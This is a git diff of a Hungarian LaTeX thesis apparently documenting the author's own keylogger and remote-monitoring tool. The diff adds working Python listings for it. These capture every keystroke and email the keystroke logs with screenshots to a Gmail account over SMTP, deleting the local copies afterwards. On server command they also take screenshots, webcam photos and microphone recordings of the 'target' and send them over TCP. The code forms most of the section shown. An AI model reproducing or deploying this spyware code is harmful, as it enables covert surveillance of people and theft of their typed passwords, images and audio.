 A harmadik osztály a $MenuHandler$, amely segítségével más feladatot is adhatunk a kliensnek a billentyűzet naplózása mellett. Ez az osztály is a $Thread$ osztályból származik, mert egy külön szál kell amiatt, hogy ne blokkolódjon az adatfeldolgozás. Ennek az osztálynak egy attribútumja van: a kapcsolat. Ez a kapcsolat fogja megvalósítani az opciók küldését a kliensnek. Itt négy opció lehet:
@@ -478,58 +528,18 @@ Természetesen le van kezelve, ha nem 1-től 4-ig adunk meg számokat, akkor egy
 \end{figure}
 
 \subsection{Kliens}\label{subsec:client}
+%atfogalmazni
 A kliensnél nagyjából ugyan az a felállítás, mint a szerver oldalon. Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a ``Client'' osztály, amelynek négy attribútumja van: ip cím, port, a kliens és a gép ip címje. Példányosításkor a szerver ip címét kell megadni. A kliens attribútum megmondja, hogy milyen kapcsolatot hozunk létre, ebben az esetben TCP, mert a szerver is TCP.
 
 \subsubsection{Client osztály}\label{subsubsec:clinetclass}
 
 A kapcsolat létesítésében a $connect$ függvény játszik szerepet. A $socket$ modul $gethostname$ függvényét alkalmazva megkapjuk a gép ip címjét, amely csak egy lokális ip cím. A darwin rendszereknél hozzá kell fűzni a ``.local'' karakterláncot, másképp egy exception lép fel.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture10}
-\caption{connect Clinet}
-\label{fig:connectclient}
-\end{figure}
 
-%\begin{algorithmic}[H]
-%\Function{connect}{$self$}
-%	\State kapcsolódik a szerverhez
-%	\try
-%		\State $self.pc\_ip \gets$ számítógép ip címe
-%	\catch{socket.gaierror}
-%		\try
-%			\State $self.pc\_ip \gets$ számítógép ip címe + '.local'
-%		\catch
-%			\State $self.pc\_ip \gets$ 'Unknown'
-%		\endtry
-%	\catch{}
-%		\State $self.pc\_ip \gets$ 'Unknown'
-%	\endtry
-%\EndFunction
-%\end{algorithmic}
+%szekvencia diagram
 
 \subsubsection{KeyLoggerClient osztály}\label{subsubsec:keyloggerclientclass}
 Ez az osztály valósítsa meg a lenyomott billentyűk kezelését. Hat attribútumot tartalmazó osztály: a kapcsolat, gmail cím, gmail jelszó, gmail api, gmail port és a lenyomott billentyűt tartalmazó változó.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture11}
-\caption{ctor KeyLoggerClient}
-\label{fig:ctorkeyloggerclient}
-\end{figure}
 
-%\begin{algorithmic}[H]
-%\Function{\_\_init\_\_}{$self,connection,email\_address,email\_password$}
-%	\State $self.email\_address \gets email\_address$
-%	\State $self.email\_password \gets email\_password$
-%	\State $self.smtp\_alias \gets\ 'smtp.gmail.com'$
-%	\State $self.smtp\_port \gets 587$
-%	\State $self.keys \gets None$
-%	\If{$connection\ \textbf{is}\ Client$}
-%		\State $self.connection \gets connection$
-%	\Else
-%		\State \textbf{raise} $TypeError$
-%	\EndIf
-%\EndFunction
-%\end{algorithmic}
 Az első adat nem követi a megállapított protokolt. Ez az adat tartalmazza a kliens rendszerének információit:
 \begin{itemize}
 \item system name
@@ -541,282 +551,208 @@ Az első adat nem követi a megállapított protokolt. Ez az adat tartalmazza a 
 \item user name
 \item ip address
 \end{itemize}
-Ezek után el lesz indítva egy halgató, amely lehalgatja a számítógéphez csatlakoztatott billentyűzetet, amely akkor írja felül a $keys$ attribútumot, amikor a felhaszáló elengedi a billentyűt. Az attribútum felülírásáról az $on\_release$ függveny gondoskodik.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture12}
-\caption{Listener}
-\label{fig:listener}
-\end{figure}
-\begin{figure}[H]
-\centering
-\includegraphics{../images/Capture13}
-\caption{on\_release}
-\label{fig:onrelease}
-\end{figure}
+Ezek után el lesz indítva egy halgató, amely lehalgatja a számítógéphez csatlakoztatott billentyűzetet, amely akkor írja felül a $keys$ attribútumot, amikor a felhaszáló elengedi a billentyűt.
+\begin{lstlisting}{language=Python}
+keyboard_listener = Listener(on_release=self.on_release)
+keyboard_listener.start()
+\end{lstlisting}
+Az attribútum felülírásáról az $on\_release$ függveny gondoskodik.
+\begin{lstlisting}{language=Python}
+def on_release(self, key):
+	self.keys = key
+\end{lstlisting}
 
-%\begin{algorithmic}[H]
-%\State $keyboard\_listener \gets \Call{Listener}{$on\_release$}$
-%\State $keyboard\_listener.\Call{start}{$$}$
-%\Function{on\_release}{$self,key$}
-%	\State $self.keys \gets key$
-%\EndFunction
-%\end{algorithmic}
+A billentyűzet lehalgató után felépítődik az adat, amit a kapcsolaton keresztül elküld. Minden adatépítés után a $keys$ változó a $None$ értéket veszi fel. Adatépítésre és küldésre csak akkor kerül sor, ha a $keys$ változó nem $None$.
+\begin{lstlisting}{language=Python}
+if self.keys is not None:
+	date_time = get_time()
+	key = str(self.keys).replace("'", "")
+	data = ["chars", date_time, key]
+	self.keys = None
+	data = str(data)
+\end{lstlisting}
+A $get\_time$ függvény visszatéríti az adott időt ``nap/hónap/év $|$ óra:perc:másodperc'' formátumban.
+\begin{lstlisting}{language=Python}
+'''
+Gets current time
 
-A billentyűzet lehalgató után egy végtelen ciklusban felépítődik az adat, amit a kapcsolaton keresztül elküld. Minden adatépítés után a $keys$ változó a $None$ értéket veszi fel. Adatépítésre és küldésre csak akkor kerül sor, ha a $keys$ változó nem $None$.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture14}
-\caption{adatépítés}
-\label{fig:databuild}
-\end{figure}
-%\begin{algorithmic}[H]
-%\If{$self.keys \neq None$}
-%	\State $date\_time \gets \Call{get\_time}{$$}$
-%	\State $key \gets \Call{str}{$self.keys$}.\Call{replace}{$''`'',''''$}$
-%	\State $data \gets [''char'', date\_time, key]$
-%	\State $self.keys \gets None$
-%	\State $data \gets \Call{str}{$data$}$
-%\EndIf
-%\end{algorithmic}
-\justify{A $get\_time$ függvény visszatéríti az adott időt ``nap/hónap/év | óra:perc:másodperc'' formátumban.}
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture15}
-\caption{get\_time}
-\label{fig:gettime}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{get\_time}{}
-%	\State $date\_time \gets$ dd/mm/yyyy $|$ HH:MM:SS formátumban az idő
-%\EndFunction
-%\end{algorithmic}
-\justify{A $keys$ változóba karakterként vagy karakterláncként kerül a lenyomott billentyű, ezért le kell cseélni a szélső idézőjeleket üres karakterekre. Karakter helyett akkor kerül karakterlánc, ha olyan karaktereket nyomunk le, amelyek nem nyomtathatóak, például: ENTER, SPACE, F1, F2, stb. Ilyenkor $Key.enter$ vagy $Key.space$ stb formátumban kapjuk meg.}
+@return: time in dd/mm/yyyy | HH:MM:SS format
+'''
+def get_time():
+	date_time = datetime.now().strftime("%d/%m/%Y | %H:%M:%S")
+	return date_time
+\end{lstlisting}
+A $keys$ változóba karakterként vagy karakterláncként kerül a lenyomott billentyű, ezért le kell cseélni a szélső idézőjeleket üres karakterekre. Karakter helyett akkor kerül karakterlánc, ha olyan karaktereket nyomunk le, amelyek nem nyomtathatóak, például: $ENTER$, $SPACE$, stb. Ilyenkor $Key.enter$ vagy $Key.space$ stb formátumban kapjuk meg.
 
-Ha a kapcsolat felbomlott, akkor e-mail-en keresztül küldi tovább az adatokat óránként. Itt lépnek érvénybe a gmail cím, a jelszó, a gmail api, és a gmail port, lásd Figure \ref{fig:ctorkeyloggerclient}. Az adat felépítése ugyan úgy zajlik, mint eddig, lásd Figure \ref{fig:databuild}. Ebben az esetben a lenyomott billentyűket összegyűjtjük egy állományba és azt csatoljuk később az e-mail-hez a képernyőképpel együtt. Egy e-mail felépítése python-ban:
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture16}
-\caption{e-mail törzse}
-\label{fig:emailbody}
-\end{figure}
-%\begin{algorithmic}[H]
-%\State $msg \gets \Call{MIMEMultipart}{$$}$
-%\State $msg['From'] \gets email\_address$
-%\State $msg['To'] \gets email\_address$
-%\State $msg['Subject'] \gets 'Keylogger result'$
-%\State $body \gets date\_time$
-%\State $body \gets \Call{MIMEText}{$body,'plain'$}$
-%\State $msg.\Call{attach}{$body$}$
-%\end{algorithmic}
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture17}
-\caption{e-mail csatolmányok}
-\label{fig:emailattach}
-\end{figure}
-%\begin{algorithmic}[H]
-%\State $file\_attachment \gets \Call{MIMEBase}{$'application','octet-stream'$}$
-%\State $image\_attachment \gets \Call{MIMEBase}{$'application','octet-stream'$}$
-%\State $file\_attachment.\Call{set\_payload}{$fájl tartalma$}$
-%\State base64 kódolás
-%\State hozzácsatolás az e-mail-hez
-%\State képernyőkép készítés
-%\State $image\_attachment.\Call{set\_payload}{$fájl tartalma$}$
-%\State base64 kódolás
-%\State hozzácsatolás az e-mail-hez
-%\end{algorithmic}
+Ha a kapcsolat felbomlott, akkor e-mail-en keresztül küldi tovább az adatokat óránként. Itt lépnek érvénybe a gmail cím, a jelszó, a gmail api, és a gmail port. Az adat felépítése ugyan úgy zajlik, mint a TCP kapcsolat alatt. Ebben az esetben a lenyomott billentyűket összegyűjti egy állományba és azt csatolja később az e-mail-hez a képernyőképpel együtt. Egy e-mail felépítése python 3-ban:
+\begin{lstlisting}{language=Python}
+msg = MIMEMultipart()
+msg['From'] = self.email_address
+msg['To'] = self.email_address
+msg['Subject'] = 'Keylogger result'
+body = date_time
+msg.attach(MIMEText(body, 'plain'))
+file_attachment = MIMEBase('application', 'octet-stream')
+
+with open(os.path.join(temp_path, filename), 'rb') as handler:
+file_attachment.set_payload(handler.read())
+
+encoders.encode_base64(file_attachment)
+file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
+msg.attach(file_attachment)
+
+if take_screenshot(temp_path):
+	image_attachment = MIMEBase('application', 'octet-stream')
+
+	with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
+		image_attachment.set_payload(handler.read())
+
+	encoders.encode_base64(image_attachment)
+	image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
+	msg.attach(image_attachment)
+
+content = msg.as_string()
+\end{lstlisting}
 Miután felépítettük az e-mail-t, kell csatlakozni a gmail szerverhez és elküldeni azt. Ha az e-mail sikeresen el lett küldve, akkor az az állomány, amelybe a lenyomott billentyűket mentettük, törlésre kerül, hogy ne küldjük el ugyan azt mégegyszer. A $content$ változó tartalmazza a teljes e-mail-t a csatolmányokkal együtt.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture18}
-\caption{e-mail küldés}
-\label{fig:sendemail}
-\end{figure}
-%\begin{algorithmic}[H]
-%\State $content \gets$ üzenet karakterlánc formátumban
-%\State kapcsolat létesítés a gmail szerverrel
-%\State bejelentkezés
-%\State e-mail küldés
-%\State fájlok törlése
-%\end{algorithmic}
+\begin{lstlisting}{language=Python}
+with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
+	smtp_server.starttls()
+	smtp_server.login(self.email_address, self.email_password)
+	smtp_server.sendmail(self.email_address, self.email_address, content)
+
+if os.path.isfile(os.path.join(temp_path, filename)):
+	os.remove(os.path.join(temp_path, filename))
+if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
+	os.remove(os.path.join(temp_path, "screenshot.png"))
+\end{lstlisting}
 
 \subsubsection{MenuHandlerClient osztály}\label{subsubsec:menuhandlerclinet}
 A $MenuHandlerClient$ osztály foglalkozik az opciók fogadásával, és az opciók által elvégzett feladatokkal. Ez az osztály egy külön szálon kell, hogy fusson, máskülönben blokkolná a fő szálat, ahol a billentyűzetet hallgató osztály fut, lasd \pageref{subsubsec:keyloggerclientclass}. oldal 4.2.2, ezért a $Thread$ osztályból származtatjuk.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture19}
-\caption{ctor MenuHandlerClient}
-\label{fig:ctormenuhandlerclient}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{\_\_init\_\_}{$self,connection$}
-%	\State bővített osztály konstruktor hívása
-%	\If{$connection\ \textbf{is}\ Client$}
-%		\State $self.connection \gets connection$
-%	\Else
-%		\State \textbf{raise} $TypeError$
-%	\EndIf
-%\EndFunction
-%\end{algorithmic}
-A szervertől kapott opciók döntik el, hogy milyen adatot épít fel, és küldi el a program:
+A szervertől kapott opciók döntik el, hogy milyen adatot épít fel, és küld el a program:
 \begin{itemize}
 \item 1 - képernyőkép
 \item 2 - webkamerakép
 \item 3 - hangrögzítés
 \item 4 - felbontja a kapcsolatot
 \end{itemize}
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture20}
-\caption{képernyőkép}
-\label{fig:image}
-\end{figure}
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture21}
-\caption{webkamerakép}
-\label{fig:wcpic}
-\end{figure}
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture22}
-\caption{hangrögzítés}
-\label{fig:audio}
-\end{figure}
+\begin{lstlisting}{language=Python}
+date_time = datetime.now().strftime("%d_%H_%M_%S")
+if option == '1':
+	data = ["image", date_time]
 
-%\begin{algorithmic}[H]
-%\If{\Call{take\_screenshot}{$temp\_path$}}
-%	\If{$screenshot.png$ fájl létezik}
-%		\State $data.\Call{append}{$fájl tartalma$}$
-%	\Else
-%		\State $data.\Call{append}{$'Error'$}$
-%	\EndIf
-%\Else
-%	\State $data.\Call{append}{$'Error'$}$
-%\EndIf
-%\If{\Call{take\_webcam\_picture}{$temp\_path$}}
-%	\If{$wc\_picture.png$ fájl létezik}
-%		\State $data.\Call{append}{$fájl tartalma$}$
-%	\Else
-%		\State $data.\Call{append}{$'Error'$}$
-%	\EndIf
-%\Else
-%	\State $data.\Call{append}{$'Error'$}$
-%\EndIf
-%\If{\Call{record\_audio}{$temp\_path$}}
-%	\If{$rec\_audio.wav$ fájl létezik}
-%		\State $data.\Call{append}{$fájl tartalma$}$
-%	\Else
-%		\State $data.\Call{append}{$'Error'$}$
-%	\EndIf
-%\Else
-%	\State $data.\Call{append}{$'Error'$}$
-%\EndIf
-%\end{algorithmic}
+	if take_screenshot(temp_path):
+		if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
+			with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
+				data.append(handler.read())
+		else:
+			data.append("Error")
+	else:
+		data.append("Error")
 
-A Figure \ref{fig:image} $take\_screenshot$ függvénye fogja megcsinálni a képernyőképet. Ugyan ez érvényes a Figure \ref{fig:wcpic} $take\_webcam\_picture$ és a Figure \ref{fig:audio} $record\_audio$ függvényekre is:
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture23}
-\caption{take\_screenshot}
-\label{fig:takeimage}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{take\_screenshot}{$save\_path$}
-%	\try
-%		\State képernyőkép készítése
-%	\catch{}
-%		\State \Return $False$
-%	\endtry
-%	\State \Return $True$
-%\EndFunction
-%\end{algorithmic}
+	try:
+		self.connection.client.sendall(str(data).encode())
+	except:
+		break
+elif option == '2':
+	data = ["wcpic", date_time]
 
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture24}
-\caption{take\_webcam\_picture}
-\label{fig:takewcpic}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{take\_webcam\_picture}{$save\_path$}
-%	\State kamera előkészítése
-%	\If{sikeres kamera megnyitás}
-%		\State elment egy képet
-%		\State \Return $True$
-%	\EndIf
-%	\State \Return $False$
-%\EndFunction
-%\end{algorithmic}
+	if take_webcam_picture(temp_path):
+		if os.path.isfile(os.path.join(temp_path, "wc_picture.png")):
+			with open(os.path.join(temp_path, "wc_picture.png"), 'rb') as handler:
+				data.append(handler.read())
+		else:
+			data.append("Error")
+	else:
+		data.append("Error")
 
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture25}
-\caption{record\_audio}
-\label{fig:recordaud}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{record\_audio}{$save\_path$}
-%	\State $1024$ bájtos részek
-%	\State $int16$ formátum
-%	\State $2$ csatorna
-%	\State $44100 hz$ hullámhossz
-%	\State $10$ másodperces időintervalum
-%	\try
-%		\State hangfelvétel készítése
-%		\State hangfelvétel lementése
-%	\catch{}
-%		\State \Return $False$
-%	\endtry
-%	\State \Return $True$
-%\EndFunction
-%\end{algorithmic}
-A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán ($2 = 0$ és $1$) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni.
+	try:
+		self.connection.client.sendall(str(data).encode())
+	except:
+		break
+elif option == '3':
+	data = ["audio", date_time]
+
+	if record_audio(temp_path):
+		if os.path.isfile(os.path.join(temp_path, "rec_audio.wav")):
+			with open(os.path.join(temp_path, "rec_audio.wav"), 'rb') as handler:
+				data.append(handler.read())
+		else:
+			data.append("Error")
+	else:
+		data.append("Error")
+
+	try:
+		self.connection.client.sendall(str(data).encode())
+	except:
+		break
+elif option == '4' or stop_threads:
+	data = ["close", date_time, "Exit"]
+	self.connection.client.sendall(str(data).encode())
+	self.connection.client.close()
+	break
+\end{lstlisting}
+
+A $take\_screenshot$ függvény fogja megcsinálni a képernyőképet, amely igazat térít vissza, ha sikerült lementenie a képet a $save\_path$ változó tartalmazta helyre. Ugyan ezek érvényesek a $take\_webcam\_picture$ és a $record\_audio$ függvényekre is.
+\begin{lstlisting}{language=Python}
+def take_screenshot(save_path):
+	try:
+		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
+	except:
+		return False
+	return True
+
+	
+def take_webcam_picture(save_path):
+	video_capture = cv2.VideoCapture(0)
+	if video_capture.isOpened():
+		rval, frame = video_capture.read()
+		cv2.imwrite(os.path.join(save_path, "wc_picture.png"), frame)
+		return True
+	return False
+
+
+def record_audio(save_path):
+	chunk = 1024
+	sample_format = pyaudio.paInt16 # 16 bits per sample
+	channels = 2
+	fs = 44100 # Record at 44100 samples per second
+	seconds = 10
+
+	pa = pyaudio.PyAudio()
+
+	try:
+		stream = pa.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
+		frames = []
+
+		for i in range(0, int(fs / chunk * seconds)):
+			data = stream.read(chunk)
+			frames.append(data)
+
+		stream.stop_stream()
+		stream.close()
+		pa.terminate()
+
+		wf = wave.open(os.path.join(save_path, "rec_audio.wav"), 'wb')
+		wf.setnchannels(channels)
+		wf.setsampwidth(pa.get_sample_size(sample_format))
+		wf.setframerate(fs)
+		wf.writeframes(b''.join(frames))
+		wf.close()
+	except:
+		return False
+	return True
+\end{lstlisting}
+A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán ($2 = 0$ és $1$) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, ami említésre kerül a komponensek bemotatásánál.
 
 \subsection{GUI}\label{subsec:gui}
 A GUI akkor lép működésbe, amikor a kliens csatlakozott a szerverhez, és addig funkcionál, amíg be nem zárják. Van egy $Date\ \&\ Time$ és egy $Characters$ mezője. Az első oszlop tartalmazza az idő béjeget, hogy mikor volt egy bizonyos karakter megnyomva. A második oszlop a lenyomott karaktereket taartalmazza kezdésben. Három gomb találhato az ablak tetején: $PC\ Information$, $Characters$ és $Words$.
 \begin{figure}[H]
 \centering
-\includegraphics[width=400pt]{../images/GUI\ final}
+\includegraphics[width=400pt, height=435pt]{../images/GUI\ final}
 \caption{GUI}
 \label{fig:gui}
 \end{figure}
-Ha a $PC\ Information$ gomb kerül megnyomásra, akkor felugrik egy másik ablak, amely tartalmazza a felhasználó (target) redszerinformációit, lásd \pageref{subsubsec:keyloggerclientclass} oldal.
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/Capture28}
-\caption{PC Information button}
-\label{fig:pcinfo}
-\end{figure}
-%\begin{algorithmic}[H]
-%\Function{PCInfo\_clicked}{$self$}
-%	\State új $tkinter$ objektum létrehozása
-%	\State cím beállítása
-%	\State egy cimke létrehozása
-%	\State megjeleníteni az ablakban a rendszer információit állományból kiolvasva
-%\EndFunction
-%\end{algorithmic}
-A $Characters$ és a $Words$ gombok a megjelenítésért felelnek. Ahogyan a nevük is mondja, a $Characters$ gomb csak a karaktereket mutatja, míg a $Words$ gomb felépíti a szavakat, és azokat mutatja. Egy szó végét a $SPACE$ vagy az $ENTER$ karakterek jelentik.
-
-%\begin{algorithmic}[H]
-%\Function{characters\_clicked}{$self$}
-%	\If{$self.is\_characters = True$}
-%		\State \Return $None$
-%	\EndIf
-%	\State $self.is\_characters \gets True$
-%	\State hozzáadni az új karaktert a megjelenítőhőz
-%	\State a $Words$ gomb szövegét átállítani $Characters$-re
-%\EndFunction
-%\Function{words\_clicked}{$self$}
-%	\If{$self.is\_characters = False$}
-%		\State \Return $None$
-%	\EndIf
-%	\State $self.is\_characters \gets False$
-%	\State kiolvasni a karaktereket és felépíteni a szavakat
-%	\State a $Characters$ gomb szövegét átállítani $Words$-ra
-%\EndFunction
-%\end{algorithmic}
+Ha a $PC\ Information$ gomb kerül megnyomásra, akkor felugrik egy másik ablak, amely tartalmazza a felhasználó (target) redszerinformációit, lásd \pageref{subsubsec:keyloggerclientclass} oldal. A $Characters$ és a $Words$ gombok a megjelenítésért felelnek. Ahogyan a nevük is mondja, a $Characters$ gomb csak a karaktereket mutatja, míg a $Words$ gomb felépíti a szavakat, és azokat jeleníti meg. Egy szó végét a $SPACE$ vagy az $ENTER$ karakterek jelentik.
 
 \section{A rendszer felhasználása \ (szoftverek és hardverek esetében)}\label{sec:useage}
 
